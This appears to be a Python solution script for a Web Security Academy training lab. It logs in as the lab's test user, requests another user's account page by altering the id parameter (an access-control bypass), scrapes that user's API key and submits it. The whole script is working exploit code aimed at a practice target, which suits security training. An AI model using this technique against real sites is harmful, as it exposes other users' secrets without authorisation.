import requests
from bs4 import BeautifulSoup
import re

s = requests.Session()
site = '0ab500b80396a716816c1be80052002a.web-security-academy.net'

login_url = f'https://{site}/login'
login_data = { 'password' : 'peter', 'username' : 'wiener'}
resp = s.post(login_url, data=login_data)

resp = s.get('https://0ab500b80396a716816c1be80052002a.web-security-academy.net/my-account?id=carlos')
soup = BeautifulSoup(resp.text,'html.parser')
div_text = soup.find('div', string=re.compile('API')).text
api_key = div_text.split(' ')[4]

url = f'https://{site}/submitSolution'
resp = s.post(url,data={'answer':api_key})